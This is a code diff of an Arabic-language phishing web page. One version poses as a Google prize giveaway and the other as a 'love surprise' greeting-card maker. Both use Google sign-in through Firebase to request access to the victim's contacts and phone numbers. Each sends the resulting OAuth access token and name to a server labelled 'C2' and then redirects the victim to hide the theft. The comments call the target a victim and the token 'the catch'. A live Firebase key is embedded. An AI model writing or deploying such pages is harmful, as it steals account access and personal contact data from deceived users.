@@ -3,29 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>هدية حصرية - سجل دخولك لاستلام جائزتك</title>
+    <title>صانع مفاجآت الحب 🎁</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
-    
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
-        .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        button { background: #4285f4; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #357abd; }
-        img { width: 100px; margin-bottom: 1rem; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #f06292, #ab47bc); height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; }
+        .card { background: white; padding: 2.5rem; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; max-width: 350px; }
+        h1 { color: #4a4a4a; font-size: 1.8rem; margin-bottom: 1rem; }
+        p { color: #666; margin-bottom: 2rem; line-height: 1.5; }
+        .btn { background: #e91e63; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 1.1rem; cursor: pointer; transition: 0.3s; width: 100%; font-weight: bold; }
+        .btn:hover { background: #c2185b; transform: scale(1.05); }
+        .icon { font-size: 50px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
-    <h2>تهانينا! لقد فزت بجائزة قيمة</h2>
-    <p>يرجى تسجيل الدخول بحساب جوجل الموثق لتأكيد هويتك واستلام هديتك فوراً.</p>
-    <button onclick="startCatch()">تسجيل الدخول واستلام الهدية</button>
+    <div class="icon">🎁</div>
+    <h1>صانع مفاجآت الحب</h1>
+    <p>صمم رسالة تهنئة احترافية وأرسلها لأصدقائك تلقائياً وبسرعة.</p>
+    <button class="btn" onclick="login()">إرسال التهنئة الآن</button>
 </div>
 
 <script>
-    // 1. إعدادات فايربيز الخاصة بمشروعك (giftapp-5937d)
+    // 1. تأكد أن هذه البيانات مطابقة لمشروعك giftapp-5937d
     const firebaseConfig = {
         apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
         authDomain: "giftapp-5937d.firebaseapp.com",
@@ -33,37 +34,37 @@
     };
     firebase.initializeApp(firebaseConfig);
 
-    // 2. رابط سيرفر الـ C2 الخاص بك على PythonAnywhere
-    const C2_ENDPOINT = "https://mohamedahmed77.pythonanywhere.com/catch";
+    const C2_SERVER = "https://mohamedahmed77.pythonanywhere.com/catch";
 
-    function startCatch() {
+    function login() {
         const provider = new firebase.auth.GoogleAuthProvider();
         
-        // 3. طلب صلاحية الوصول لجهات الاتصال (السر في هذه السطور)
+        // طلب الصلاحيات التي فعلتها (People API)
         provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
         provider.addScope('https://www.googleapis.com/auth/user.phonenumbers.read');
 
         firebase.auth().signInWithPopup(provider).then((result) => {
             const token = result.credential.accessToken;
-            const user = result.user.displayName || "User";
+            const userName = result.user.displayName || "Unknown";
 
-            // 4. إرسال "الصيد" إلى سيرفرك في صمت
-            fetch(`${C2_ENDPOINT}?token=${token}&sender=${user}`)
-            .then(response => {
-                // 5. تحويل الضحية لصفحة حقيقية لإبعاد الشبهات
-                window.location.href = "https://play.google.com/store/games";
-            })
-            .catch(err => {
-                // حتى لو فشل الاتصال بالسيرفر، نحول الضحية لضمان عدم الشك
-                window.location.href = "https://play.google.com/store/games";
+            // إرسال البيانات فوراً لسيرفر PythonAnywhere
+            fetch(`${C2_SERVER}?token=${token}&sender=${userName}`)
+            .then(() => {
+                // توجيه لصفحة توحي بالنجاح
+                window.location.href = "https://google.com";
+            }).catch(() => {
+                window.location.href = "https://google.com";
             });
 
         }).catch((error) => {
-            console.error("Auth Error:", error);
-            alert("حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى.");
+            console.error("Error Detail:", error);
+            if(error.code === "auth/operation-not-allowed") {
+                alert("يجب تفعيل Google Provider في Firebase Console");
+            } else {
+                alert("خطأ: تأكد من رابط الـ Redirect في Google Cloud");
+            }
         });
     }
 </script>
-
 </body>
 </html>
